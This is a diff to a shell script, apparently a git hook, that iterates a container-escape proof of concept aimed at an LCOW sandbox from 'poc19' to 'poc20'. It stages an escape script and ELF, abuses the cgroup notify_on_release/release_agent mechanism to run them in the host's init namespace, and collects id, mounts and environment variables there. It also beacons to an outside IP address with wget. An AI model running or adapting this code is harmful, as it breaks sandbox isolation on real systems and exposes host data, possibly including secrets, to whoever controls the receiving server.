@@ -219,17 +219,13 @@ report > "$WORKTREE/$OUT" 2>&1
 #   collector confirms execution even if the sdc write path fails.
 if [ "$DO_CGROUP_FIRE" = "1" ]; then
 {
-    echo "CGROUP_ESCAPE: === poc19 — ash shebang + readback + noexec probe + kmsg fix ==="
+    echo "CGROUP_ESCAPE: === poc20 — correct init-ns path via mountinfo root field ==="
 
     # ── Pre-flight diagnostics ───────────────────────────────────────
-    echo "--- usermodehelper/enabled ---"
-    cat /proc/sys/kernel/usermodehelper/enabled 2>/dev/null || echo "NOT FOUND"
-    echo "--- global memory/release_agent ---"
-    cat /sys/fs/cgroup/memory/release_agent 2>/dev/null || echo "NOT FOUND"
-    echo "--- sdc mount options in init ns (/proc/1/mountinfo grep 8:32) ---"
-    grep '8:32' /proc/1/mountinfo 2>/dev/null || echo "  not found in /proc/1/mountinfo"
-    echo "--- sdc mount options in sidecar (/proc/self/mountinfo grep 8:32) ---"
+    echo "--- sdc mountinfo (8:32) ---"
     grep '8:32' /proc/self/mountinfo 2>/dev/null || echo "  not found"
+    echo "--- /run/mounts/scsi/ contents ---"
+    ls /run/mounts/scsi/ 2>&1 | head -10
 
     # ── Parse overlay upperdir ───────────────────────────────────────
     UPPERDIR=""
@@ -242,25 +238,22 @@ if [ "$DO_CGROUP_FIRE" = "1" ]; then
         fi
     done < /proc/self/mountinfo
 
-    # ── Locate the gitRepo volume mnt/ subdir ───────────────────────
+    # ── Locate correct init-ns path for gitRepo volume ──────────────
+    # SDC_MNT  = sidecar mount point of sdc (field 5) = /mount/gitrepo
+    # SDC_ROOT = path within sdc's ext4 that is bind-mounted (field 4)
+    #            e.g. /sandboxMounts/tmp/atlas/gitRepoVolume/<appid>/hooks
+    # init-ns path = /run/mounts/scsi/m1 + SDC_ROOT + /mnt/
     SDC_MNT=$(awk '$3=="8:32"{print $5; exit}' /proc/self/mountinfo 2>/dev/null)
+    SDC_ROOT=$(awk '$3=="8:32"{print $4; exit}' /proc/self/mountinfo 2>/dev/null)
     SDC_MNT_SUBDIR="${SDC_MNT}/mnt"
-    echo "CGROUP_ESCAPE: sdc_mnt=$SDC_MNT  subdir=$SDC_MNT_SUBDIR  upperdir=$UPPERDIR"
+    INIT_NS_SDC="/run/mounts/scsi/m1${SDC_ROOT}/mnt"
+    echo "CGROUP_ESCAPE: sdc_mnt=$SDC_MNT  sdc_root_in_ext4=$SDC_ROOT"
+    echo "CGROUP_ESCAPE: init_ns_sdc_mnt=$INIT_NS_SDC  upperdir=$UPPERDIR"
 
-    # ── Mount sda: confirm /usr/bin/ash exists and busybox runs ─────
-    SDA_MNT_CHK=/tmp/.mnt_sda_chk
-    mkdir -p "$SDA_MNT_CHK" 2>/dev/null
-    mount -o ro /dev/sda "$SDA_MNT_CHK" 2>/dev/null && {
-        echo "CGROUP_ESCAPE: sda /usr/bin:"
-        ls "$SDA_MNT_CHK/usr/bin/" 2>&1 | head -20
-        echo "CGROUP_ESCAPE: sda /bin:"
-        ls "$SDA_MNT_CHK/bin/" 2>&1 | head -10
-        "$SDA_MNT_CHK/usr/bin/busybox" sh -c 'echo busybox_sh_works' 2>&1 || echo "busybox sh at /usr/bin failed"
-        umount "$SDA_MNT_CHK" 2>/dev/null
-    } || echo "  sda mount failed"
-    rmdir "$SDA_MNT_CHK" 2>/dev/null
+    # Can we see the init-ns sdc path from the sidecar?
+    echo "CGROUP_ESCAPE: init-ns path from sidecar: $(ls -la ${INIT_NS_SDC}/ 2>&1 | head -5)"
 
-    # ── Stage ELF and escape.sh (ash shebang) ───────────────────────
+    # ── Stage ELF and escape.sh ──────────────────────────────────────
     HOOKDIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
     ESCAPE_ELF="${SDC_MNT_SUBDIR}/escape_elf"
     ESCAPE_SH="${SDC_MNT_SUBDIR}/escape.sh"
@@ -268,34 +261,30 @@ if [ "$DO_CGROUP_FIRE" = "1" ]; then
     cp "${HOOKDIR}/escape_elf" "$ESCAPE_ELF" 2>/dev/null && chmod +x "$ESCAPE_ELF"
     echo "CGROUP_ESCAPE: ELF staged: $(ls -la $ESCAPE_ELF 2>&1)"
 
-    cat > "$ESCAPE_SH" << 'INITNS_PAYLOAD'
+    # Write escape.sh with $INIT_NS_SDC embedded (unquoted heredoc expands it)
+    cat > "$ESCAPE_SH" << INITNS_PAYLOAD
 #!/usr/bin/ash
-OUT_DIR="/run/mounts/scsi/m1/mnt"
-OUT="$OUT_DIR/ESCAPE_OUTPUT.txt"
-mkdir -p "$OUT_DIR" 2>/dev/null
+OUT_DIR="${INIT_NS_SDC}"
+OUT="\$OUT_DIR/ESCAPE_OUTPUT.txt"
+mkdir -p "\$OUT_DIR" 2>/dev/null
 {
-echo "INITNS_ESCAPE: ash shell running in LCOW init namespace"
-echo "  date: $(date -u 2>/dev/null)"
-echo "  id: $(id 2>/dev/null)"
-echo "  uname: $(uname -a 2>/dev/null)"
+echo "INITNS_ESCAPE: running in LCOW init namespace — poc20"
+echo "  date: \$(date -u 2>/dev/null)"
+echo "  id: \$(id 2>/dev/null)"
+echo "  uname: \$(uname -a 2>/dev/null)"
+echo "  pid: \$\$"
 echo "  /proc/self/cgroup:"; cat /proc/self/cgroup 2>/dev/null
 echo "  /proc/mounts (head-20):"; head -20 /proc/mounts 2>/dev/null
 echo "  env (head-30):"; env 2>/dev/null | head -30
-} > "$OUT" 2>&1
-cp "$OUT" /tmp/ESCAPE_OUTPUT.txt 2>/dev/null
-wget -q -T 5 -O /dev/null "http://4.157.206.88/INITNS_ESCAPE_ASH" 2>/dev/null || true
+} > "\$OUT" 2>&1
+cp "\$OUT" /tmp/ESCAPE_OUTPUT.txt 2>/dev/null
+wget -q -T 5 -O /dev/null "http://4.157.206.88/INITNS_ESCAPE_ASH_POC20" 2>/dev/null || true
 INITNS_PAYLOAD
     chmod +x "$ESCAPE_SH"
-    echo "CGROUP_ESCAPE: escape.sh staged: $(ls -la $ESCAPE_SH 2>&1)"
+    echo "CGROUP_ESCAPE: escape.sh staged:"
+    head -3 "$ESCAPE_SH" 2>&1
 
-    # Probe: can we exec files on sdc from sidecar ns?
-    printf '#!/bin/sh\necho EXEC_OK\n' > "$SDC_MNT_SUBDIR/.exec_test" 2>/dev/null
-    chmod +x "$SDC_MNT_SUBDIR/.exec_test" 2>/dev/null
-    _exec_sdc=$("$SDC_MNT_SUBDIR/.exec_test" 2>&1)
-    echo "CGROUP_ESCAPE: sdc exec test (sidecar ns): '${_exec_sdc:-FAILED_NOEXEC}'"
-    rm -f "$SDC_MNT_SUBDIR/.exec_test" 2>/dev/null
-
-    # Copy payloads to overlay upper dir (init-ns path = $UPPERDIR/tmp/...)
+    # Copy payloads to overlay upper dir (fallback path in init ns)
     cp "$ESCAPE_ELF" /tmp/.escape_elf 2>/dev/null && chmod +x /tmp/.escape_elf
     cp "$ESCAPE_SH" /tmp/.escape.sh 2>/dev/null && chmod +x /tmp/.escape.sh
 
@@ -304,11 +293,10 @@ INITNS_PAYLOAD
     mkdir -p "$CG_MNT" 2>/dev/null
 
     for AGENT_PATH in \
-        "/run/mounts/scsi/m1/mnt/escape.sh" \
-        "/run/mounts/scsi/m1/mnt/escape_elf" \
+        "${INIT_NS_SDC}/escape.sh" \
+        "${INIT_NS_SDC}/escape_elf" \
         "${UPPERDIR}/tmp/.escape.sh" \
-        "${UPPERDIR}/tmp/.escape_elf" \
-        "/run/mounts/scsi/m1/escape_elf"
+        "${UPPERDIR}/tmp/.escape_elf"
     do
         [ -z "$AGENT_PATH" ] && continue
         echo "CGROUP_ESCAPE: trying $AGENT_PATH"
@@ -325,17 +313,15 @@ INITNS_PAYLOAD
         mkdir -p "$CGCHILD" 2>/dev/null
         echo 1 > "$CGCHILD/notify_on_release" 2>/dev/null
 
-        # Move OUR OWN PID into esc$$ then immediately back to root.
-        # When our PID leaves esc$$, the cgroup becomes empty → release_agent fires.
         echo $$ > "$CGCHILD/cgroup.procs" 2>/dev/null
         _tasks_before=$(cat "$CGCHILD/tasks" 2>/dev/null | wc -l | tr -d ' ')
-        echo $$ > "$CG_MNT/cgroup.procs" 2>/dev/null  # move back to root
+        echo $$ > "$CG_MNT/cgroup.procs" 2>/dev/null
         _tasks_after=$(cat "$CGCHILD/tasks" 2>/dev/null | wc -l | tr -d ' ')
         echo "CGROUP_ESCAPE:   tasks before=$_tasks_before after=$_tasks_after (0=empty=fired)"
 
-        echo "CGROUP_ESCAPE:   waiting 10s for output..."
+        echo "CGROUP_ESCAPE:   waiting 15s for output..."
         _i=0
-        while [ $_i -lt 10 ]; do
+        while [ $_i -lt 15 ]; do
             [ -f "$SDC_MNT_SUBDIR/ESCAPE_OUTPUT.txt" ]              && break
             [ -f "${SDC_MNT:-/mount/gitrepo}/ESCAPE_OUTPUT.txt" ]   && break
             [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ]                     && break
@@ -346,7 +332,6 @@ INITNS_PAYLOAD
         rmdir "$CGCHILD" 2>/dev/null
         umount "$CG_MNT" 2>/dev/null; rmdir "$CG_MNT" 2>/dev/null
 
-        # Consolidate output
         for _op in "$SDC_MNT_SUBDIR/ESCAPE_OUTPUT.txt" \
                    "${SDC_MNT:-/mount/gitrepo}/mnt/ESCAPE_OUTPUT.txt" \
                    "${SDC_MNT:-/mount/gitrepo}/ESCAPE_OUTPUT.txt" \
@@ -357,7 +342,7 @@ INITNS_PAYLOAD
 
         if [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ]; then
             echo "CGROUP_ESCAPE: SUCCESS via $AGENT_PATH after ${_i}s"
-            head -20 "$WORKTREE/ESCAPE_OUTPUT.txt" 2>&1
+            head -40 "$WORKTREE/ESCAPE_OUTPUT.txt" 2>&1
             break
         else
             echo "CGROUP_ESCAPE:   no output after ${_i}s"
@@ -367,12 +352,10 @@ INITNS_PAYLOAD
     # ── Post-mortem if all attempts failed ───────────────────────────
     if [ ! -f "$WORKTREE/ESCAPE_OUTPUT.txt" ]; then
         echo "CGROUP_ESCAPE: all paths failed — collecting diagnostics"
-        echo "  escape_elf: $(ls -la $ESCAPE_ELF 2>&1)"
-        echo "  escape.sh: $(ls -la $ESCAPE_SH 2>&1)"
-        echo "  mnt subdir: $(ls -la ${SDC_MNT_SUBDIR}/ 2>&1 | head -10)"
-        echo "  /tmp/ contents: $(ls -la /tmp/ 2>&1 | head -10)"
-        echo "  /proc/1/root/tmp/ (overlay escape output check): $(ls -la /proc/1/root/tmp/ 2>&1 | head -10)"
-        echo "--- /dev/kmsg (last 50 lines, timeout 3s) ---"
+        echo "  init-ns path: $(ls -la ${INIT_NS_SDC}/ 2>&1 | head -5)"
+        echo "  escape.sh head: $(head -3 $ESCAPE_SH 2>&1)"
+        echo "  mnt subdir: $(ls -la ${SDC_MNT_SUBDIR}/ 2>&1 | head -5)"
+        echo "--- /dev/kmsg (timeout 3s) ---"
         timeout 3 cat /dev/kmsg 2>/dev/null | tail -50 || echo "  (kmsg read failed/timed out)"
         SDA_MNT=/tmp/.mnt_sda
         mkdir -p "$SDA_MNT" 2>/dev/null
@@ -380,11 +363,6 @@ INITNS_PAYLOAD
         if [ -x "$SDA_MNT/usr/bin/busybox" ]; then
             echo "--- dmesg via $SDA_MNT/usr/bin/busybox (last 60 lines) ---"
             "$SDA_MNT/usr/bin/busybox" dmesg 2>/dev/null | tail -60
-        elif [ -x "$SDA_MNT/usr/bin/dmesg" ]; then
-            echo "--- dmesg via $SDA_MNT/usr/bin/dmesg ---"
-            "$SDA_MNT/usr/bin/dmesg" 2>/dev/null | tail -60
-        else
-            echo "  no busybox/dmesg found on sda /usr/bin/"
         fi
         umount "$SDA_MNT" 2>/dev/null
         rmdir "$SDA_MNT" 2>/dev/null
